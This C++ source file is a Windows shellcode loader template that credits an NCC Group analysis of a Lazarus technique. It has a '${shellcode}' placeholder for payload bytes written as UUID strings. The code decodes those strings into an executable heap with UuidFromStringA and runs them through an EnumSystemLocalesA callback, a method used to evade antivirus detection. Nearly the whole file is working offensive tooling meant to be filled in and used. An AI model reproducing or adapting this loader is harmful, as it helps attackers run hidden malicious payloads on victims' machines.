#include <Windows.h>
#include <Rpc.h>
#include <iostream>
 /* Tyvm NCCGroup https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/ */
#pragma comment(lib, "Rpcrt4.lib")

const char* uuids[] =
{
 "${shellcode}"
};

int main()
{
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = HeapAlloc(hc, 0, 0x100000);
    DWORD_PTR hptr = (DWORD_PTR)ha;
    int elems = sizeof(uuids) / sizeof(uuids[0]);
    
    for (int i = 0; i < elems; i++) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);
        if (status != RPC_S_OK) {
            printf("UuidFromStringA() != S_OK\n");
            CloseHandle(ha);
            return -1;
        }
         hptr += 16;
    }
    printf("[*] Hexdump: ");
    for (int i = 0; i < elems*16; i++) {
        printf("%02X ", ((unsigned char*)ha)[i]);
    }
    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
    CloseHandle(ha);
    return 0;
}
